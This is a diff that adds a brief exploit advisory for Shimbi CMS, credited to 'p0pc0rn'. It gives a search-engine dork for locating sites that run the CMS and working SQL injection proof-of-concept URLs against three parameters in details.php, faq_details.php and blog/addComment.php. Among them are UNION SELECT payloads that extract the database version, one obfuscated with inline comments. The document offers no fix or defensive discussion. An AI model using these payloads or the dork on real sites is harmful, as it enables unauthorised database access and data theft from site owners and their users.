@@ -1,0 +1,33 @@
+Title  : Shimbi CMS Vulnerable to Multiple SQL Injections
+Vendor : http://www.shimbi.in/
+Found by : p0pc0rn
+Dork   : intext:"Powered By Shimbi CMS" 
+
+SQL Injection in details.php parameter
+---------------------------------------
+http://site.com/details.php?id=[sql]
+
+POC 
+--- 
+http://site.com/details.php?id=112 UNION SELECT 1,2,3,4,version(),6,7,8
+
+SQL Injection in faq_details.php parameter
+---------------------------------------
+http://site.com/faq_details.php?flag=q&id=[sql]
+
+POC
+---
+http://site.com/faq_details.php?flag=q&id=1'
+
+SQL Injection in blog/addComment.php parameter
+---------------------------------------
+http://site.com/blog/addComment.php?topic_id=[sql]
+
+POC
+---
+http://site.com/blog/addComment.php?stat=stat&type=t&category_id=9&topic_id=-122/**/UNION/**/SELECT/**/1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16--
+
+thanks,
+-p0pc0rn-
+
+	   
